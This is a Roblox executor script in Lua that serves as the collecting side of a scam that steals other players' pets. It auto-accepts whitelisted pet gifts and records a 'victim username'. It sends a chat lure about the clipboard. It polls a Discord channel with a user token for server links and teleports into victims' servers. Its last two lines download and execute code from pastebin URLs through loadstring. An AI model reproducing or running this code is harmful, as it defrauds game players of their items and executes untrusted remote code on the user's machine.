if not game:IsLoaded() then
	game.Loaded:Wait()
end

warn("✅ SCRIPT LOADED")

_G.Pets = { 'Stegosaurus', 'Golden Lab', 'Raptor', 'Triceratops' }

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local VirtualUser = game:GetService("VirtualUser")
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer
local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
local GiftPet = GameEvents:WaitForChild("GiftPet")
local AcceptPetGift = GameEvents:WaitForChild("AcceptPetGift")
local Backpack = LocalPlayer:WaitForChild("Backpack")
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local isProcessing = false
local PET_TO_CLAIM = _G.Pets
local victimFile = isfile("user_gag.txt")
local joinedFile = isfile("joined_ids.txt")
local victimUser = victimFile and readfile("user_gag.txt") or "victim username"
local joinedIds = joinedFile and HttpServ:JSONDecode(readfile("joined_ids.txt")) or {}
local didVictimLeave = false
local timer = 0
local lastMessageId = nil

if not victimFile then
    writefile("user_gag.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]")
end

print("✅ Auto-Accept Script: Loaded and waiting for gifts...")
print("📦 Pets to accept:", table.concat(PET_TO_CLAIM, ", "))

-- Wait for the pet to appear in backpack with the exact fullName
local function waitForExactPet(fullName)
    print("⏳ Waiting for pet in backpack with name:", fullName)
    local timeout = 10
    local elapsed = 0 -- Ensure elapsed is declared before use

    while elapsed < timeout do
        for _, pet in ipairs(Backpack:GetChildren()) do
            if pet.Name == fullName then
                print("✅ Pet appeared in backpack:", fullName)
                return true
            end
        end
        task.wait(0.5)
        elapsed = elapsed + 0.5 -- Increment elapsed correctly
    end

    print("❌ Pet not found in backpack after 10s:", fullName)
    return false
end

-- Extracts base pet name without tags (used for whitelist)
local function extractBaseName(fullName)
	local base = fullName:gsub("%s*%[.-%]", "")
	return base:match("^%s*(.-)%s*$")
end

-- Hook into gift event
task.defer(function()
	print("🔌 Hooking into GiftPet RemoteEvent...")

	GiftPet.OnClientEvent:Connect(function(giftID, fullName, sender)
		print("🎁 Gift received:", giftID, fullName, sender)

		local basePetName = extractBaseName(fullName)
		print("🔍 Base pet name:", basePetName)

		if not table.find(PET_TO_CLAIM, basePetName) then
			print("⚠️ Pet not in whitelist. Ignoring gift from:", sender)
			return
		end

		while isProcessing do
			task.wait(0.1)
		end
		isProcessing = true

		print("✅ Accepting gift from", sender, "with full name:", fullName)

		local success = pcall(function()
			AcceptPetGift:FireServer(true, giftID)
			print("🚀 Gift accepted (ID:", giftID, ")")
		end)

		if success then
			waitForExactPet(fullName)
		else
			print("❌ Failed to accept gift.")
		end

		isProcessing = false
	end)

	print("✅ GiftPet listener successfully hooked.")
end)

-- Check activity status
local function checkActivityStatus()
    print("Roblox window is IN FOCUS.")
end

RunService.Heartbeat:Connect(function()
    local currentStatusIsInactive = false
    local lastStatus = _G.RobloxFocusStatus

    if lastStatus == nil then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    elseif (currentStatusIsInactive and not lastStatus) or (not currentStatusIsInactive and lastStatus) then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    end
end)

checkActivityStatus()

-- Anti-AFK
VirtualUser.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- Wait for player data to load
while LocalPlayer:GetAttribute("DataFullyLoaded") ~= true do
    LocalPlayer:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while LocalPlayer:GetAttribute("Finished_Loading") ~= true do
    LocalPlayer:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while LocalPlayer:GetAttribute("Loading_Screen_Finished") ~= true do
    LocalPlayer:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end

-- Accept gifts from UI
local giftNoti = PlayerGui:WaitForChild("Gift_Notification"):WaitForChild("Frame")

local function acceptGifts()
    while task.wait(0.1) do
        for _, v in pairs(giftNoti:GetChildren()) do
            if v:IsA("ImageLabel") then
                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
                replicatesignal(acceptImageButton.MouseButton1Click)
            end
        end
    end
end

task.spawn(acceptGifts)

-- Chat messages
TextChatService.TextChannels.RBXGeneral:SendAsync('Yo gng check yo clipboard')
wait(0.5)
TextChatService.TextChannels.RBXGeneral:SendAsync('GGS')

-- Timer
local function increaseTimer()
    while task.wait(1) do
        timer = timer + 1
    end
end

task.spawn(increaseTimer)

-- Monitor player leaving
local function waitForPlayerLeave()
    local connection
    connection = Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if connection then
                connection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

waitForPlayerLeave()

-- Auto-join Discord servers
local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

local function autoJoin()
    if token == "" or channelId == "" then
        LocalPlayer:Kick("Add your token or channelId to use")
        return
    end

    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=1",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            ['Content-Type'] = 'application/json'
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then return end

        local message = messages[1]
        if message.id == lastMessageId or table.find(joinedIds, tostring(message.id)) then return end

        local content = message.content or ""
        local placeId, jobId = string.match(content, "TeleportToPlaceInstance%((%d+),%s*['\"]([%w%-]+)['\"]%)")
        if placeId and jobId then
            lastMessageId = message.id
            saveJoinedId(tostring(message.id))
            writefile("user_gag.txt", "unknown")
            TeleportService:TeleportToPlaceInstance(placeId, jobId)
        end
    else
        print("Invalid response code:", response.StatusCode)
    end
end

while task.wait(5) do
    autoJoin()
end

loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()
